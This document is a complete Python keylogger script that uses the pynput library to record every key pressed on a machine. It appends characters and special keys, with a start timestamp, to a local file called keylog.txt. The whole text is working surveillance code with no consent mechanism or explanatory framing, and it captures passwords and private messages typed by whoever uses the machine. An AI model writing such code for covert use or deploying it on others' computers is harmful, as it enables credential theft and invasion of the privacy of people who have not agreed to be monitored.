from pynput import keyboard
import datetime

# File to store keystrokes
log_file = "keylog.txt"

# Add a timestamp when the program starts
with open(log_file, "a") as f:
    f.write(f"\n\n[Started Logging at {datetime.datetime.now()}]\n")

def on_press(key):
    try:
        # Attempt to get the character
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
